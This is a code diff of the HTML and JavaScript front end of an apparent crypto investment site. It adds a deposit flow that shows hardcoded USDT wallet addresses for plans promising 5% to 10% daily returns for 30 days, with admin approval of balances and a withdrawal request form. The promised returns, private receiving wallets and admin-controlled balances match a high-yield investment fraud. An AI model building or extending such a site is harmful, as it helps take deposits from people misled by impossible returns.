@@ -26,6 +26,7 @@ button{
   color:white;
   cursor:pointer;
 }
+button:hover{background:#16a34a;}
 input,select{
   width:100%;
   padding:10px;
@@ -33,6 +34,7 @@ input,select{
   border-radius:8px;
   border:none;
 }
+.small{font-size:12px;color:#ccc;}
 </style>
 </head>
 <body>
@@ -45,16 +47,25 @@ input,select{
 <h3>Balance: $<span id="balance">0</span></h3>
 </div>
 
+<!-- DEPOSIT TO INVEST -->
 <div class="card">
-<h3>Invest</h3>
+<h3>Deposit To Activate Plan</h3>
 <select id="planSelect">
 <option value="starter">Starter - $5 (5% daily 30 days)</option>
 <option value="silver">Silver - $10 (5% daily 30 days)</option>
 <option value="diamond">Diamond - $20 (10% daily 30 days)</option>
 </select>
-<button onclick="investPlan()">Invest</button>
+<button onclick="investPlan()">Deposit Now</button>
+<p class="small">Send exact amount. Admin must approve before balance updates.</p>
 </div>
 
+<!-- INVEST FROM BALANCE -->
+<div class="card">
+<h3>Start Investment (After Deposit Approval)</h3>
+<button onclick="startInvestment()">Use Balance To Invest</button>
+</div>
+
+<!-- WITHDRAW -->
 <div class="card">
 <h3>Withdraw</h3>
 <input type="number" id="withdrawAmount" placeholder="Amount">
@@ -62,7 +73,7 @@ input,select{
 <select id="withdrawNetwork">
 <option>TRC20</option>
 <option>BSC BEP20</option>
-<option>BNB BEP20</option>
+<option>ERC20</option>
 </select>
 <button onclick="requestWithdraw()">Request Withdrawal</button>
 </div>
@@ -75,6 +86,7 @@ input,select{
 </div>
 
 <script type="module">
+
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
 import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
 import { getDatabase, ref, push, onValue, get, update } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
@@ -109,17 +121,63 @@ document.getElementById("balance").innerText =
 });
 }
 
-/* INVEST */
+/* =========================
+   STEP 1: DEPOSIT SYSTEM
+=========================*/
 window.investPlan = async()=>{
+const user = auth.currentUser;
+const plan = document.getElementById("planSelect").value;
+
+let amount= plan==="starter"?5:plan==="silver"?10:20;
+
+const network = prompt("Select Network:\n1 = TRC20\n2 = BSC BEP20\n3 = ERC20");
+
+let wallet="";
+let networkName="";
+
+if(network=="1"){
+wallet="TKJAvkyjdDSzKtS1HihiKno1tTfi2bTJJe";
+networkName="USDT TRC20";
+}
+else if(network=="2"){
+wallet="0xB66E1e0e5452489298bebd7Cd463587E6866baD2";
+networkName="BSC BEP20";
+}
+else if(network=="3"){
+wallet="0xB66E1e0e5452489298bebd7Cd463587E6866baD2";
+networkName="USDT ERC20";
+}
+else{
+alert("Invalid selection");
+return;
+}
+
+alert("Send $" + amount + " to:\n\n" + wallet + "\n\nAfter payment, admin will approve.");
+
+await push(ref(db,'deposits'),{
+uid:user.uid,
+amount,
+plan,
+network:networkName,
+status:"pending",
+date:Date.now()
+});
+
+alert("Deposit request submitted. Wait for admin approval.");
+};
+
+/* =========================
+   STEP 2: START INVESTMENT
+=========================*/
+window.startInvestment = async()=>{
 const user=auth.currentUser;
 const plan=document.getElementById("planSelect").value;
-
 let amount= plan==="starter"?5:plan==="silver"?10:20;
 
 const snap=await get(ref(db,'users/'+user.uid));
 let balance=snap.val()?.balance||0;
 
-if(balance<amount) return alert("Insufficient balance");
+if(balance<amount) return alert("Deposit must be approved first.");
 
 await update(ref(db,'users/'+user.uid),{
 balance:balance-amount
@@ -135,7 +193,9 @@ paid:false
 alert("Investment Started");
 };
 
-/* WITHDRAW (ANTI NEGATIVE + ANTI MULTIPLE PENDING) */
+/* =========================
+   WITHDRAW (SAFE)
+=========================*/
 window.requestWithdraw = async()=>{
 const user=auth.currentUser;
 const amount=parseFloat(document.getElementById("withdrawAmount").value);
@@ -163,7 +223,9 @@ date:Date.now()
 alert("Withdrawal request submitted");
 };
 
-/* LOAD INVESTMENTS + MANUAL MATURITY */
+/* =========================
+   MATURITY SYSTEM
+=========================*/
 function loadInvestments(user){
 onValue(ref(db,'investments/'+user.uid),(snap)=>{
 const data=snap.val();
